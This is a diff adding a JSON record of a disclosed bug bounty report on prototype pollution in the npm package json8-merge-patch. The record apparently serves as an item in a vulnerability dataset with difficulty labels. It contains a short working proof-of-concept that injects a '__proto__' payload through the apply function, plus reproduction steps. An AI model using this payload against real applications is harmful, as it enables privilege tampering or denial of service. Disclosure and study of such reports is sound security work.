@@ -1,0 +1,38 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "gkmr ",
+    "title": "[json8-merge-patch] Prototype Pollution",
+    "content": "\nI would like to report a Prototype Pollution vulnerability in json8-merge-patch\nThe apply function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior.\nModule\nmodule name: json8-merge-patch\nversion: v1.0.1\nnpm page: https://www.npmjs.com/package/json8-merge-patch\nModule Description\nJSON Merge Patch RFC 7396 toolkit for JavaScript.\nModule Stats\nWeekly downloads: 517\nVulnerability\nVulnerability Description\nThe apply function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior, which may allow obtaining sensitive information/DoS/RCE.\nSteps To Reproduce:\nInstall json8-merge-patch module\nnpm i json8-merge-patch\ncreate a file poc.js with content :\nCode 222 Bytes\n1let json8mergepatch = require(\"json8-merge-patch\");\n2var obj = {}\n3console.log(\"Before : \" + obj.isAdmin);\n4json8mergepatch.apply(obj, JSON.parse('{ \"__proto__\": { \"isAdmin\": true }}'));\n5console.log(\"After : \" + obj.isAdmin);\nExecute using: node poc.js\nOutput:\nBefore: undefined\nAfter: true\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Windows 10\nNODEJS VERSION: v12.18.3\nNPM VERSION: 6.14.6\nWrap up\nI contacted the maintainer to let them know: [Y]\nI opened an issue in the related repository: [Y]\nRef: https://github.com/sonnyp/JSON8/issues/113\nImpact\nCan result in sensitive information disclosure/DoS/RCE. (depends on implementation)\n\n",
+    "severity": [
+        7.3,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Modification of Assumed-Immutable Data (MAID)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1603023000,
+    "report_url": "https://hackerone.com/reports/980649",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install json8-merge-patch module: npm i json8-merge-patch"
+        ],
+        [
+            2,
+            "Create a file poc.js with the provided content and execute it using: node poc.js"
+        ]
+    ],
+    "vuln_description": "The apply function in json8-merge-patch fails to restrict access to prototypes of objects, allowing for modification of prototype behavior, which may lead to sensitive information disclosure, DoS, or RCE.",
+    "reason": "The vulnerability involves a straightforward prototype pollution attack, which is a well-known pattern in JavaScript. The steps to reproduce are simple and do not require understanding complex interactions or manipulating application states.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
